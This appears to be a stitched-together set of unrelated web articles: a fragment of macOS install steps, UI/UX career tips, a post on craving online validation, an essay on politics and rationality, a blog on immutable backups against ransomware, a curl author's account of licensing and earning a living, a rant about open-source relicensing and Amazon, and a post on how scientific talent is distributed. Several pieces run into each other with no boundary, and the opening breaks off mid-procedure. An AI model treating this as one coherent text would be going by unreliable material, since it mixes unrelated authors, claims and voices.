path/to/disk/macosx10.0</code></pre></figure> <h3>Step 4: after the installer fininshes</h3> <p>You will end up seeing a failed boot screen after the installer finishes.

<p>In order for us to truly live to our potentials, <strong>we must strive for what our heart</strong> wants. Passion plays a big role in our lives; it opens doors for us to fully make the most of our capabilities and carries us to places where we want to be. Being in the industry – fresh from the university, we tend to let our decisiveness rule over and pick the job that eventually we get tired of. However, <strong>life doesn’t stop when we are tired, in fact, it opens doors for us to actually look onto the bigger picture and think of the greater opportunities in store for us</strong>.</p>



<p>As young developers, it’s never too late to try and to dive into the diverse fields. We might be hesitant at first, but trying out new things might unleash the best of us. In my case, at the moment, I am trying to discover the wonders of UI/UX Design while at the same time being a full-stack developer. And to those of you who are interested, then let me share how I reach this point in time.</p>



<p>I always hated being a frontend developer before because it wasn’t as challenging as being a full-stack developer is. As years pass by, I already reached my goal to become one; however, I ended up being frustrated and tired because of the problem-solving cycle. But, as I progress, I realized that in all fields, I’d feel the same way, I will end up being bored if I wasn’t doing something I really like.</p>



<p>It’s not that I am saying that I didn’t enjoy the way to become a full-stack developer but <strong>there was something wrong, it was like I am for something else.</strong> Then and there, I was able to notice the swift projection of my skills when it comes to integrating and critiquing designs. It wasn’t really far from what I wanted from before. I always wanted to become a designer but wasn’t able to really hone my skillset since my mind was diverted or should I say converted to the backend process and all.</p>



<p>During the quarantine, I had more time to learn and to console myself with the things that I am very much passionate about so I decided to involve myself with UI/UX Design. As I recalled, I consulted with my fellow peers who are UI/UX Designers as well and provided me with some tips, I’d like to share to you as well. <strong>Here are some tips, you can follow to begin your designer career.</strong> <em>(Note nothing is easy the first time around, you just have to enjoy the ride and make it from the best of your capabilities)</em></p>



<ol><li><strong>Scribble your Designs on Paper</strong>. This scribble will act as the skeleton or base of your design. Some might ask why scribble, why not do it directly on designing platforms? Scribble or sketches works the same with pseudocodes in programming. Why we do pseudocodes? – so, we can transcribe our understanding to a partial code. Since, the more we understand the process the more ideas will come across our minds.</li></ol>



<ol start="2"><li><strong>Interpreting your designs to Prototypes. </strong>This is the most interesting and fun part when you see that slowly the sketches turning to lively prototypes. Some of the applications I can suggest that you’ll use:<ol><li><strong>Adobe XD –</strong> I would suggest using this if you are using Illustrator and Photoshop to place images in your prototype since the three applications are both from Adobe, it’s easier to integrate things.</li><li><strong>Figma (Recommended)</strong> – For beginners, I would suggest they’d use Figma since Figma is lighter than Adobe XD and Adobe Photoshop. And you access it on your web browsers directly.</li><li><strong>Adobe InDesign </strong>– I haven’t used InDesign for web prototypes but I was able to use it for magazines and flyers but I know the same with Adobe XD and Photoshop you can do a lot of good prototypes here.</li></ol></li></ol>



<p>Basically, whatever application you use, it won’t matter as long as you choose what you are comfortable using with then it’s okay.</p>



<ol start="3"><li><strong>Watch Video Tutorials. </strong>The first thing that you thought, people will do is to watch video tutorials of designs or prototype events or actions. But I believe that watching will not help you if you won’t apply it so I would suggest you bring out first your creative side then you’ll know if you are interested or not then go improve yourself by watching tutorials. A lot of UI/UX Designers share their knowledge and provide very effective and efficient trainings for free. I know there are also paid courses in Coursera or other learning sites that can provide you more but for a beginner who is just starting to lit a fire in their new journey, I’d suggest you start off with watching free tutorials then if you really want to go deep then you can go enroll yourself to courses that will expand and improve your skillset.</li></ol>



<ol start="4"><li><strong>Read</strong>. The same with video tutorials, reading will also allow you to ponder things from those experienced UI/UX Designers or standard UI/UX protocols so you will be able to follow the norm and the standard in designing. (You can opt to watch videos if you are not that into reading). Here are some articles you might want to visit and start reading to improve your prototypes.</li></ol>



<ul><li><a href="https://www.interaction-design.org/" target="_blank" rel="noreferrer noopener">https://www.interaction-design.org/</a></li><li><a href="https://lawsofux.com/" target="_blank" rel="noreferrer noopener">https://lawsofux.com/</a></li><li><a href="https://www.toptal.com/designers/web/ui-design-best-practices" target="_blank" rel="noreferrer noopener">https://www.toptal.com/designers/web/ui-design-best-practices</a></li><li><a href="https://allproductnews.com/" target="_blank" rel="noreferrer noopener">https://allproductnews.com/</a></li></ul>



<ol start="5"><li><strong>Critique</strong>. The only way we can improve ourselves is to look for other stuffs that we could see the lapse. Don’t get me wrong this is just to exercise the critical thinking and the creative juices you have as a designer. You have to look into similar sites so you’ll know the norm on how to design those type of website based on the process. You can also improve in a way to you can avoid those lapses and not do it on your prototypes.</li></ol>



<ol start="6"><li><strong>Join Bootcamps, Design Discussions, or Webinars</strong>. These talks might be boring but if you try to really dig deep and listen, a lot of designers can provide more than enough wisdom to you. I know everybody has their own style of design but we can derive something useful from.</li></ol>



<p>To you who is reading, if you are thinking twice, it’s never too late to try and learn. You can still be a full-stack developer or whatever you want to be an Architect or etc. and at the same time become a designer, it won’t be easy at first but I believe that when your passion kicks in, regardless of how busy your schedule is, you’ll always find time to insert it in between. There is nothing wrong challenging yourself once in a while, that makes our lives more interesting and fun!</p>



<p>Happy Learning!</p>

    <p>We crave validation, all the time. It never stops.</p>
<p>We crave validation from ourselves, other humans, even our pets, and our environment.</p>
<p>This craving for validation starts from a young age. We learn to seek it. Constantly. At Home. At School. At the workplace.</p>
<p>We seek it from our Parents. Our siblings. Our Friends. Our Boss, Our Co-workers. Strangers on the internet.</p>
<p>This need for validation is an endless loop. The more we get it, the more we crave it.  It’s hacking our brains. And it has received a massive boost from online social networks.</p>
<p>We post a tweet, and start staring at the Notifications, waiting for that blue dot to appear. </p>
<p>Every time it’s delayed by seconds, we feel a little bit sad at not getting that fix right away. </p>
<p>Time it shows up, we feel validated for posting that tasty morsel of a sentence.</p>
<p>We feel heartbroken that not enough people have upvoted our product on Product Hunt</p>
<p>Why didn’t enough people vote on my Hacker News Post?(I launched a whole product around this need.)</p>
<p>We envy the Reddit Mods(nay Gods) who decide if people can see our post. </p>
<p>Constantly staring at the Follower count.</p>
<p>Mood going up and down along with the trend lines in the graph.</p>
<p>We are hooked.</p>
<p>PS: You can indulge my validation need :-) by following me on <a target="_blank" rel="noopener" href="https://twitter.com/harishkgarg">Twitter</a> where I share lot of the updates.

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="wikitext">



<p> ❦
</p>
<p>People go funny in the head when talking about politics. The evolutionary reasons for this are so obvious as to be worth belaboring: In the ancestral environment, politics was a matter of life and death. And sex, and wealth, and allies, and reputation… When, today, you get into an argument about whether “we” ought to raise the minimum wage, you’re executing adaptations for an ancestral environment where being on the wrong side of the argument could get you killed. Being on the <em>right</em> side of the argument could let <em>you</em> kill your hated rival!
</p>
<p>If you want to make a point about science, or rationality, then my advice is to not choose a domain from <em>contemporary</em> politics if you can possibly avoid it. If your point is inherently about politics, then talk about Louis XVI during the French Revolution. Politics is an important domain to which we should individually apply our rationality—but it’s a terrible domain in which to <em>learn</em> rationality, or discuss rationality, unless all the discussants are already rational.
</p>
<p>Politics is an extension of war by other means. Arguments are soldiers. Once you know which side you’re on, you must support all arguments of that side, and attack all arguments that appear to favor the enemy side; otherwise it’s like stabbing your soldiers in the back—providing aid and comfort to the enemy. People who would be level-headed about evenhandedly weighing all sides of an issue in their professional life as scientists, can suddenly turn into slogan-chanting zombies when there’s a <a href="https://www.readthesequences.com/A-Fable-Of-Science-And-Politics">Blue or Green</a> position on an issue.
</p>
<p>In Artificial Intelligence, and particularly in the domain of nonmonotonic reasoning, there’s a standard problem: “All Quakers are pacifists. All Republicans are not pacifists. Nixon is a Quaker and a Republican. Is Nixon a pacifist?”
</p>
<p>What on Earth was the point of choosing this as an example? To rouse the political emotions of the readers and distract them from the main question? To make Republicans feel unwelcome in courses on Artificial Intelligence and discourage them from entering the field? (And no, I am not a Republican. Or a Democrat.)
</p>
<p>Why would anyone pick such a <em>distracting</em> example to illustrate nonmonotonic reasoning? Probably because the author just couldn’t resist getting in a good, solid dig at those hated Greens. It feels so <em>good</em> to get in a hearty punch, y’know, it’s like trying to resist a chocolate cookie.
</p>
<p>As with chocolate cookies, not everything that feels pleasurable is good for you.
</p>
<p>I’m not saying that I think we should be apolitical, or even that we should adopt Wikipedia’s ideal of the <a href="https://en.wikipedia.org/wiki/Wikipedia:Neutral_point_of_view" rel="nofollow">Neutral Point of View</a>. But try to resist getting in those good, solid digs if you can possibly avoid it. If your topic legitimately relates to attempts to ban evolution in school curricula, then go ahead and talk about it—but don’t blame it explicitly on the whole Republican Party; some of your readers may be Republicans, and they may feel that the problem is a few rogues, not the entire party. As with Wikipedia’s <span>npov</span>, it doesn’t matter whether (you think) the Republican Party really <em>is</em> at fault. It’s just better for the spiritual growth of the community to discuss the issue without invoking color politics.

January 15, 2021 | https://codenotary.com/blog/immutability-vs-ransomware | <a href="https://web.archive.org/web/*/https://codenotary.com/blog/immutability-vs-ransomware">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><article><div>
<p><img src="https://codenotary.com/images/blog/mascotfree.png" width="350"></p><p>Ransomware is one of the most effective types of malware at the moment. It is blocking access by encrypting the victim’s data and demands a ransom payment to decrypt it. </p>
<p>The number of ransomware attacks has grown immensely and some ransomware crypto worms even became famous in mainstream media like WannaCry or CryptoLocker. Ransomware has the potential to take down businesses, destroying months of work, or even cost lives for example if a hospital is being crippled. A fast and reliable backup solution is the best tool against ransomware attacks. </p>
<p>Unfortunately, backups can be encrypted too. Once created we don't want our backups to be manipulated. True offline backups like tapes are possible solutions. However, it takes a long time to recover from tape, especially if the tape system is far away from the target platform. The challenge is to create immutable backups on fast storage solutions. The open-source technology <a href="https://github.com/codenotary/immudb" rel="nofollow noopener noreferrer" target="_blank">immudb</a> can fulfill the requirement of storing data immutably with unprecedented performance and scalability. </p>
<h2 id="why-immutability-is-important">Why immutability is important</h2>
<p>Things can still go wrong while cleaning an environment from ransomware. For example, if a backup is being deployed it can be reinfected because it is not yet patched against the malware. Meanwhile, everyone knows that a proper backup-strategy is key to prevent damage from ransomware, that's why it is important to protect the backups with state-of-the-art technology. Using immudb provides the following benefits:</p>
<ul>
<li>Once data is added it can't be changed or deleted</li>
<li>Each record has its own history table tracking changes</li>
<li>Scalability and performance that can keep up with your environment</li>
</ul>
<p>Neither cybercriminals nor program errors or disgruntled employees can change the records. Even if the ransomware is still active, it will not overwrite records but instead, assign a new value to it. The changes are easily tracked by using the immudb history function. Querying for the last clean record index will provide the precious backup information without much trouble.</p>
<h2 id="safe-backups-immutably">Safe backups immutably</h2>
<p>Let's get our hands on a real world example using the favorite programming languages of our gophers: Go.
This tutorial will show how to observe file changes in a directory and save the file and it's content to immudb if someone or something changed it.
<a href="https://docs.immudb.io/" rel="nofollow noopener noreferrer" target="_blank">Download</a> and follow the installation instructions of immudb. First, we have to create the directory that will be observed. </p>
<p><strong>Just keep in mind that the immudb server should run in a different and protected environment</strong> and not on the same server where the files are stored your want to protect.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
		
<p>I founded the curl project early 1998 but had already then been working on the code since <a href="https://daniel.haxx.se/blog/2021/01/03/age-is-just-a-number-or-two/" data-type="post" data-id="15434">November 1996</a>. The source code was always open, free and available to the world. The term “open source” actually wasn’t even coined until early 1998,  just weeks before curl was born.</p>



<div><figure><img loading="lazy" src="https://daniel.haxx.se/blog/wp-content/uploads/2016/05/curl-symbol.png" alt="" width="125" height="108" srcset="https://daniel.haxx.se/blog/wp-content/uploads/2016/05/curl-symbol.png 789w, https://daniel.haxx.se/blog/wp-content/uploads/2016/05/curl-symbol-200x175.png 200w, https://daniel.haxx.se/blog/wp-content/uploads/2016/05/curl-symbol-450x394.png 450w, https://daniel.haxx.se/blog/wp-content/uploads/2016/05/curl-symbol-768x672.png 768w" sizes="(max-width: 125px) 100vw, 125px"></figure></div>



<p>In the beginning of course, the first few years or so, this project wasn’t seen or discovered by many and just grew slowly and silently in a dusty corner of the Internet.</p>



<p>Already when I shipped the first versions I wanted the code to be open and freely available. For years I had seen the cool free software put out the in the world by others and I wanted my work to help build this communal treasure trove.</p>



<h2>License</h2>



<p>When I started this journey I didn’t really know what I wanted with curl’s license and exactly what rights and freedoms I wanted to give away and it took a few years and attempts before it landed.</p>



<p>The early versions were <a href="https://opensource.org/licenses/GPL-2.0">GPL licensed</a>, but as I learned about resistance from proprietary companies and thought about it further, I changed the license to be more commercially friendly and to match my conviction better. I ended up with <a href="https://opensource.org/licenses/MIT">MIT</a> after a brief experimental time using <a href="https://opensource.org/licenses/MPL-1.1">MPL</a>. (It was easy to change the license back then because I owned all the copyrights at that point.)</p>



<p>To be exact: we actually have a <a href="https://curl.se/docs/copyright.html">slightly modified MIT license</a> with some very subtle differences. The reason for the changes have been forgotten and we didn’t get those commits logged in the “big transition” to Sourceforge that we did in late 1999…  The end result is that this is now often recognized as “the curl license”, even though it is in effect the MIT license.</p>



<p>The license says everyone can use the code for whatever purpose and nobody is required to ship any source code to anyone, but they cannot claim they wrote it themselves and the license/use of the code should be mentioned in documentation or another relevant location.</p>



<p>As licenses go, this has to be one of the most frictionless ones there is.</p>



<h2>Copyright</h2>



<p>Open source relies on a solid copyright law and the copyright owners of the code are the only ones who can license it away. For a long time I was the sole copyright owner in the project. But as I had decided to stick to the license, I saw no particular downsides with allowing code and contributors (of significant contributions) to retain their copyrights on the parts they brought. To not use that as a fence to make contributions harder.</p>



<p>Today, in early 2021, I count 1441 copyright strings in the curl source code git repository. 94.9% of them have my name.</p>



<p>I never liked how some projects require copyright assignments or license agreements etc to be able to submit code or patches. Partly because of the huge administrative burden it adds to the project, but also for the significant friction and barrier to entry they create for new contributors and the unbalance it creates; some get more rights than others. I’ve always worked on making it easy and smooth for newcomers to start contributing to curl. It doesn’t happen by accident.</p>



<h2>Spare time</h2>



<p>In many ways, running a spare time open source project is easy. You just need a steady income from a “real” job and sufficient spare time, and maybe a server to host stuff on for the online presence.</p>



<p>The challenge is of course to keep developing it, adding things people want, to help users with problems and to address issues timely. Especially if you happen to be lucky and the user amount increases and the project grows in popularity.</p>



<p>I ran curl as a spare time project for decades. Over the years it became more and more common that users who submitted bug reports or asked for help about things were actually doing that during their <em>paid</em> work hours because they used  curl in a commercial surrounding – which sometimes made the situation almost absurd. The ones who actually got paid to work with curl were asking the unpaid developers to help them out.</p>



<p>I changed employers several times. I started my own company and worked as my own boss for a while. I worked for Mozilla on network stuff in Firefox for five years. But curl remained a spare time project because I couldn’t figure out how to turn it into a job without risking the project or my economy.</p>



<h2>Earning a living</h2>



<p>For many years it was a pipe dream for me to be able to work on curl as a real job. But how do I actually take the step from a spare time project to doing it full time? I give away all the code for free, and it is a solid and reliable product.</p>



<div><figure><a href="https://www.wolfssl.com/"><img loading="lazy" src="https://daniel.haxx.se/blog/wp-content/uploads/2019/01/wolfssl-logo.png" alt="" width="186" height="144" srcset="https://daniel.haxx.se/blog/wp-content/uploads/2019/01/wolfssl-logo.png 1011w, https://daniel.haxx.se/blog/wp-content/uploads/2019/01/wolfssl-logo-200x155.png 200w, https://daniel.haxx.se/blog/wp-content/uploads/2019/01/wolfssl-logo-450x348.png 450w, https://daniel.haxx.se/blog/wp-content/uploads/2019/01/wolfssl-logo-768x594.png 768w" sizes="(max-width: 186px) 100vw, 186px"></a></figure></div>



<p>The initial seeds were planted when I met and got to know Larry (wolfSSL CEO) and some of the other good people at <a href="https://www.wolfssl.com/">wolfSSL</a> back in the early 2010s. This, because wolfSSL is a company that write open source libraries and offer commercial support for them – proving that it can work as a business model. Larry always told me he thought there was a possibility waiting here for me with curl.</p>



<p>Apart from the business angle, if I would be able to work more on curl it could really benefit the curl project, and then of course indirectly everyone who uses it.</p>



<p>It was still a step to take. When <a href="https://daniel.haxx.se/blog/2018/11/18/im-leaving-mozilla/" data-type="post" data-id="11748">I gave up on Mozilla</a> in 2018, it just took a little thinking before I decided to try it. <a href="https://daniel.haxx.se/blog/2019/02/02/im-on-team-wolfssl/" data-type="post" data-id="11915">I joined wolfSSL</a> to work on curl full time. A dream came true and finally curl was not just something I did “on the side”. It only took 21 years from first curl release to reach that point…</p>



<p>I’m living the open source dream, working on the project I created myself.</p>



<h2>Food for free code</h2>



<p>We sell commercial support for curl and libcurl. Companies and users that need a helping hand or swift assistance with their problems can get it from us – and with me here I dare to claim that there’s no company anywhere else with the same ability. We can offload engineering teams with their curl issues. Up to 24/7 level!</p>



<p>We also offer custom curl development, debugging help, porting to new platforms and basically any other curl related activity you need. See more on the <a href="https://www.wolfssl.com/products/curl/">curl product page</a> on the wolfSSL site.</p>



<p>curl (mostly in the shape of libcurl) runs in <strong>ten billion installations</strong>: some five, six billion mobile phones and tablets – used by several of the most downloaded apps in existence, in virtually every website and Internet server. In a billion computer games, a billion Windows machines, half a billion TVs, half a billion game consoles and in a few hundred million cars… curl has been made to run on 82 operating systems on 22 CPU architectures. Very few software components can claim a wider use.</p>



<p><em>“Isn’t it easier to list companies that are <strong>not</strong> using curl?”</em></p>



<p>Wide use and being recognized does not bring food on the table. curl is also totally free to download, build and use. It is very solid and stable. It performs well, is documented, well tested and “battle hardened”. It “just works” for most users.</p>



<h2>Pay for support!</h2>



<p>How to convince companies that they should get a curl support contract with me?</p>



<p>Paying customers get to influence what I work on next. Not only distant road-mapping but also how to prioritize short term bug-fixes etc. We have a guaranteed response-time.</p>



<p>You get your issues first in line to get fixed. Customers also won’t risk getting their issues added the known bugs document and put in the attic to be forgotten. We can help customers make sure their application use libcurl correctly and in the best possible way.</p>



<p>I try to emphasize that by getting support from us, customers can  take away some of those tasks from their own engineers and because we are  faster and better on curl related issues, that is a pure net gain economically. For all of us.</p>



<p><strong>This is not an easy sell.</strong></p>



<p>Sure, curl is used by thousands of companies everywhere, but most of them do it because it’s free (in all meanings of the word), functional and available. There’s a real challenge in identifying those that actually use it enough and  value the functionality enough that they realize they want to improve their curl foo.</p>



<p>Most of our curl customers purchased support first when they faced a complicated issue or problem they couldn’t fix themselves –  this fact gives me this weird (to the wider curl community) incentive to <em>not</em> fix some problems too fast, because it then makes it work against my ability to gain new customers!</p>



<p>We need paying customers for this to be sustainable. When wolfSSL has a sustainable curl business, I get paid and the work I do in curl benefits all the curl users; paying as well as non-paying.</p>



<h2>Dual license</h2>



<p>There’s clearly business in releasing open source under a strong copyleft license such as GPL, and as long as you keep the copyrights, offer customers to purchase that same code under another more proprietary- friendly  license. The code is still open source and anyone doing totally open things can still use it freely and at no cost.</p>



<p>We’ve shipped <a href="https://curl.se/tiny/">tiny-curl</a> to the world licensed under GPLv3. Tiny-curl is a curl branch with a strong focus on the<em><strong> </strong></em><strong>tiny</strong> part: the idea is to provide a libcurl more suitable for smaller systems, the ones that can’t even run a full Linux but rather use an RTOS.</p>



<p>Consider it a sort of experiment. Are users interested in getting a smaller curl onto their products and are they interested in paying for licensing. So far, tiny-curl supports two separate RTOSes for which we haven’t ported the “normal” curl to.</p>



<h2>Keeping things separate</h2>



<p>Maybe you don’t realize this, but I work hard to keep separate things compartmentalized. I am not curl, curl is not wolfSSL and wolfSSL is not me.  But we  all overlap greatly!</p>



<figure><a href="https://daniel.haxx.se/blog/wp-content/uploads/2021/01/curl-circles.jpg"><img loading="lazy" src="https://daniel.haxx.se/blog/wp-content/uploads/2021/01/curl-circles.jpg" alt="" width="599" height="562"></a><figcaption>The Daniel + curl + wolfSSL trinity</figcaption></figure>



<p>I work for wolfSSL. I work on curl. wolfSSL offers commercial curl support.</p>



<h2>Reserved features</h2>



<p>One idea that we haven’t explored much yet is the ability to make and offer “reserved features” to paying customers only. This of course as another motivation for companies to become curl support customers.</p>



<p>Such reserved features would still have to be sensible for the curl project …</p></div></div>

<p>There’s been a rash of open source project relicensing happening the past few months, and in nearly every case the company making the licensing change is claiming that that they’re doing it to protect the project in question from Amazon.</p>

<p>That is a big steaming pile of bullshit.</p>

<p>First of all: There is absolutely <em>nothing</em> wrong with how Amazon is using these open source projects. They are operating completely and entirely within the bounds of the licenses of the projects. Fingers need to be wagged here, but not at Amazon.</p>

<p>These projects are not being relicensed to protect them from Amazon. Claiming that they are is at best naive and at worst wilfully lying. These companies are relicensing projects to cover for the fact that they are ignorant of how to run a successful business. They knowingly released their secret sauce under permissive licenses and have discovered that doing so means that competitors can create more compelling product offerings based upon the same technology. This is entirely in accordance not only with the licenses that these companies knowingly chose, but also with a competitive market. The only problem with this is that it came as a surprise to these “open source” companies and now they’re reacting poorly.</p>

<p>If these companies actually cared about the <em>projects</em>, they would have invested the resources to build stronger communities around them. They would have reached out to Amazon, encouraged them to contribute back to the projects, and helped them to do so. They would NOT have taken the few community contributions—and you will find that most of these projects do not have many contributions from outside of the originating company, showing how poorly they managed their communities—they would not have taken these contributions from community members and then locked them behind proprietary licenses, violating the trust of their community.</p>

<p>You will find that none of the companies that have relicensed their projects address any of these issues. They don’t discuss how they tried to engage Amazon in their communities, how their attempts fell on deaf ears or were rebuffed. They can’t do this because thus far there is no evidence to show they even tried. I know a lot of the <a href="https://aws.amazon.com/blogs/opensource/">open source leadership at Amazon</a>. They’re good people who care deeply about free and open source and who are working to do the right thing by all of the communities of the projects they build upon. They would have been very open to hearing how they could make a positive difference in those communities. They’re a relatively few people across a very large company, so it may have taken a bit more time to get those contribution balls rolling, but they would have worked very hard to do so…had they been approached.</p>

<p>So don’t fall into the trap of unquestionably believing the recent spate of anti-Amazon propaganda. It comes from, without exception, companies that simply do not appear to understand how to operate successful businesses. From what I can tell, they’ve received poor advice from their VCs. Not knowing any better, they understandably followed this advice and now they’re paying the price.</p>

<p>As far as whether there’s any chance these new licenses will be OSI approved, I answer a pretty definitive “no.” There are two reasons for this. First of all, these companies would have to <a href="https://opensource.org/approval">submit the licenses for review</a>. OSI does not just go looking for licenses to review. License creators must take the action to say, “Hey, this is a new license that we believe adheres to the <a href="https://opensource.org/osd-annotated">Open Source Definition</a>. It’s valuable to us and to the community that it be recognised as such. Could you please review it and confirm that?” So far only one company has tried that and they failed to get their license approved, because of the second reason…</p>

<p>In order to become OSI-approved, licenses must adhere to the <a href="https://opensource.org/osd-annotated">Open Source Definition (OSD)</a>. These new licenses do not. While the ways they diverge from the OSD are varied, the most common ones are that they violate either “6. No Discrimination Against Fields of Endeavor”, “8. License Must Not Be Specific to a Product”, “9. License Must Not Restrict Other Software”, or “10. License Must Be Technology-Neutral”.</p>

<p>#6 is the one most violated by these licenses. Restricting to non-commercial usage is fundamentally against the spirit of free and open source software. From the very beginning, Stallman himself was very emphatic that people be allowed to make money from free software. He and FOSS leaders after him realised that preventing people from making money from free and open source software will doom the movement. It is vitally important to FOSS that people be encouraged to use it in commercial and for-profit ventures. This will help foster the spread of FOSS. These licenses disregard both that and the benefit of this clause of the OSD to the whole of FOSS in preference to their own singular commercial needs.</p>

<p>In fact, the vibrant cloud-based and cloud-native environment within which most software companies operate now and which makes so much innovation possible (including that of these misled companies), exists because companies have released their technologies under OSI-approved licenses and have come together to collaborate on common and powerful tools. This is the culture that successful companies embrace. Even Microsoft, the former nemesis of free and open source, recognizes that this type of collaboration is critical to the continued growth and evolution of the company.</p>

<p>To be perfectly clear: There is nothing wrong with making money from software, FOSS or otherwise. Choosing to use a proprietary license for software is a valid business decision and one I support. Choosing to use an <a href="https://opensource.org/licenses">OSI-approved license</a> is an equally valid business decision and, again, one I support. However the license to choose for the software created by your company is just that: a <em>BUSINESS</em> decision.</p>

<p>There are many potential variables to consider and those variables will be different for each company, but “how will we make enough money from this to maintain and grow the company sustainably?” is one that is consistent across all of these decisions. If a company’s answer to that is, “we’ll just give away the software to bring in leads” but they don’t have a compelling enough commercial offering on top of that to convert those leads to sales, while their competitor converts those leads and more using the same technology, that is NOT the fault of open source software, licensing, or culture. That’s a company that doesn’t understand how to do business, and blaming Amazon isn’t going to change that.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
<p>In previous posts I <a href="https://nintil.com/hhmi-and-nih">said</a> that the extent to which "Fund people" works will depend on the distribution of scientific talent. Think about the following situation: Imagine that only a handful of scientists at every point in time are able to –if given the time and means–lead revolutions on par with the work of Darwin, Einstein, or Galileo (This is an extreme case admittedly because most of science does not look like this; most of science is more incremental and less memorable). I recently found two authors that believe something like this,</p>
<p>Braben, whose <a href="https://nintil.com/review-scientific-freedom">book</a> <em>Scientific Freedom</em> I reviewed says that even though most scientists could be the next Einstein if they tried, only a few will even try:</p>
<blockquote>
<p>It is possible that my message may be seen as elitist and of interest only to <strong>those very few scientists who might be putative members of a twenty - first century Planck Club</strong>. That interpretation would be wrong. One of the themes here is that almost every serious researcher is at some time in a career capable of taking those fateful steps that might lead to a great discovery or the creation of penetrating new insight. They might then need to draw on vast reserves of courage and determination, and perhaps also a little luck if they are to make progress. At any one time, of course, <strong>the proportion of researchers ready to seize that possibly once - in - a - lifetime opportunity will be very small</strong>, so if they are prevented from doing so the democratic pressure they can exert is insignifican't. [...] a properly constituted TR initiative should appeal to only a small number of scientists with radical thoughts on their minds. The challenge is to recognize them as there are millions of scientists, and one does not even know which haystack hides the needle. [...] <strong>Let us assume that there were about 300 transformative researchers — the extended membership of the Planck Club — during the twentieth century.</strong></p>
</blockquote>
<p>In physics, <a href="https://www.amazon.com/Trouble-Physics-String-Theory-Science/dp/061891868X">Lee Smolin</a> is even more on the elitist side, with even fewer scientists in the revolutionaries' club:</p>
<blockquote>
<p>“But when it comes to theoretical physics, we are not talking about much money at all. Suppose that an agency or foundation decided to fully support <strong>all the visionaries</strong> who ignore the mainstream and follow their own ambitious programs to solve the problems of quantum gravity and quantum theory. <strong>We are talking about perhaps</strong> <strong>two dozen theorists</strong>. Supporting them fully would take a tiny fraction of any large nation’s budget for physics.”</p>
</blockquote>
<p>I think there is something to this view, and it is not incompatible with what I said in my last blogpost (That peer review can select the best work). In physics, there has been <a href="https://nintil.com/is-useful-physics-over/">no progress</a> in the <a href="https://www.amazon.com/Trouble-Physics-String-Theory-Science/dp/061891868X">fundamentals</a> of the <a href="https://www.amazon.com/Lost-Math-Beauty-Physics-Astray/dp/0465094252/ref=tmm_hrd_swatch_0?_encoding=UTF8&amp;qid=1610576984&amp;sr=8-2">field</a> since the 70s, so one could argue that perhaps there are key assumptions that need to be thrown away, that there is a strong need for funding what to many physicists seem obviously wrong. In that case peer review may be stifling progress: physics could benefit from less clever math and more philosophical thought, going back to the mode of thinking of Einstein et al. as Smolin suggests. Braben does not oppose peer review in general, he argues that peer review will systematically underrate those coming up with paradigm-breaking ideas, and most of science is not that.</p>
<p>
[1]. Who are biology's geniuses? Darwin? Biology is probably less of a Kuhnian world than physics is, given that biology has fewer strong assumptions baked in that would have to be overthrown and thus count as a revolution
</p>
<p>In biology, in contrast with physics, whatever the current framework is (if any)<sup><a href="#sidenote-1">1</a></sup>, it continues to be extremely fruitful. If one takes <a href="https://www.nobelprize.org/uploads/2020/10/advanced-chemistryprize2020.pdf">CRISPR</a>, which has been arguably been a case of "good science", one can break it down into:</p>
<ol>
<li>
<p>Noticing that there are suspicious repetitive sequences in certain bacteria</p>
</li>
<li>
<p>Figuring out what those are for</p>
</li>
<li>
<p>Leveraging them into a tool for gene editing</p>
</li>
<li>
<p>Further improving CRISPR (e.g. Prime Editing)</p>
</li>
</ol>
<p>None of these examples of good science (Or perhaps engineering if you count the last 2) are paradigm shifts but without any doubt CRISPR has been highly useful and influential, both in academia, and soon in the clinic.</p>
<p>In <a href="https://d1wqtxts1xzle7.cloudfront.net/30686866/Ineq_Wikipedia.pdf?1361917900=&amp;response-content-disposition=inline%3B+filename%3DOn_the_inequality_of_contributions_to_Wi.pdf&amp;Expires=1610411522&amp;Signature=P7P2cCDnu6yNhrt1L64caVUnkBRb40qvLrCZnROjgKvsSB9IP2MavdPs86gdf6AQYNf0FPLRXnH1K-dza1dQ4mBrvhWyoAUAYMlx%7EMXivPNvU9HK%7En5l59Etl8afosE63Odc9gz5aMsWVEAZTkGfgV3peaiEbk7I%7EQfQGhLsAyvz5JXI5YBJHK8u1EWrDN9xnkgKpXavLnv0-L046CM-BJntNX2sMR6j60Lt1nnZ%7ELGYQtWsn0ixPMxhDoNzNcPRCz7y%7Ef5vUQG7KGqRt-xAG%7EOZAyM78RpSF2mp871PHkbf9w1bnojA-ibc8QlJRGtb00qDEEGLV8qi7Y0bQqimWQ__&amp;Key-Pair-Id=APKAJLOHF5GGSLRBV4ZA">wikipedia</a>, only a small fraction (10%) of the active users do most (90%) of the edits. Is science like this, or even more extreme? <a href="https://journals.plos.org/plosone/article?id=10.1371/journal.pone.0101698">Ioannidis</a> et al. (2014) note there are 15M scientists that published anything in the 1996-2011 period, but only 1% that has published every single year in this period. This smaller 150k-strong group accounts for 40% of all papers and 87% of all papers with &gt;1000 citations.</p>
<p>Nobel Prize winner William Shockley published (<a href="https://ieeexplore.ieee.org/document/4056505">1957</a>) a paper measuring the distribution of productivity in an already high-performing environment: the Los Alamos Scientific Laboratory as well as the Brookhaven National Laboratory. Shockley finds a log-normally distribution of publications and patents: Most scientists publish very little and a progressively smaller count publish increasingly more.</p>
<p>There's the observation of Lotka's law (Yes, it's the same Lotka as in Lotka-Volterra) that says that the relative frequency of authors with a given number of publications follows a power law that scales with the square of the number of articles published; for example out of 100 scientists who publishes at least 1 article, only 1 will publish 10 articles. The precise exponent may vary by discipline (Pao, <a href="https://asistdl.onlinelibrary.wiley.com/doi/abs/10.1002/(SICI)1097-4571(198601)37:1%3C26::AID-ASI4%3E3.0.CO;2-Z">1985</a>), but each one does seem to follow the same pattern: A handful of people publish an overwhelming fraction of all the papers.</p>
